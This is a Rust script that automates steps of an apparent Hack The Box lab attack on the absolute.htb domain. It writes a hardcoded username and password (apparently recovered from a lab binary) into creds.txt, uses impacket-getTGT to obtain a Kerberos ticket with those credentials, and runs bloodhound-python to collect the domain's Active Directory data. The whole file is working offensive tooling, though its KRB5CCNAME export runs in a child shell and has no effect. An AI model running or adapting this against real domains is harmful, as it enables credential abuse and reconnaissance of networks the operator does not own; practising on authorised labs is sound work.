use std::process::Command;
use std::fs::{File, OpenOptions};
use std::io::{Write, BufRead, BufReader, BufWriter};

pub fn run() {
    println!("Cheat mode activated....");
    // grabed from test.exe but we cheating
    println!("Adding stuff to creds.txt...");
    cheat_mode();
    println!("Grabbing new TGT...");
    run_impacket_gettgt_third_user();
    println!("Running Bloodhound...");
    run_bloodhound_python();
}
fn cheat_mode() {
    let new_line = "m.lovegod:AbsoluteLDAP2022!";

    let file = OpenOptions::new()
        .append(true)
        .open("creds.txt")
        .expect("Unable to open file");

    let mut file = BufWriter::new(file);
    
    writeln!(&mut file, "{}", new_line).expect("Unable to write data to file");
}

fn run_impacket_gettgt_third_user() {
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);

    // Read the third line from the creds.txt file
    let third_line = reader.lines().nth(2).expect("Unable to read third line");
    let creds = third_line.expect("Unable to parse third line");

    // Prepare the impacket-getTGT command with the specified arguments
    let output = Command::new("impacket-getTGT")
        .arg(format!("absolute.htb/{}", creds))
        .output()
        .expect("failed to execute impacket-getTGT");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Look for the line "Saving ticket in" and extract the ccache filename
    if let Some(ccache_line) = output_str.lines().find(|line| line.contains("Saving ticket in")) {
        let ccache_filename: &str = ccache_line.split("in ").nth(1).unwrap_or("").trim();

        // Run "export KRB5CCNAME="
        let export_output = Command::new("bash")
            .arg("-c")
            .arg(format!("export KRB5CCNAME={}", ccache_filename))
            .output()
            .expect("failed to execute export KRB5CCNAME command");

        println!("{}", String::from_utf8_lossy(&export_output.stdout));
        println!("{}", String::from_utf8_lossy(&export_output.stderr));
    }
}

fn run_bloodhound_python() {
    let output = Command::new("bloodhound-python")
        .arg("-u")
        .arg("m.lovegod")
        .arg("-k")
        .arg("-d")
        .arg("absolute.htb")
        .arg("-dc")
        .arg("dc.absolute.htb")
        .arg("-no-pass")
        .arg("--zip")
        .arg("-c")
        .arg("ALL")
        .output()
        .expect("failed to execute bloodhound-python");

    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}
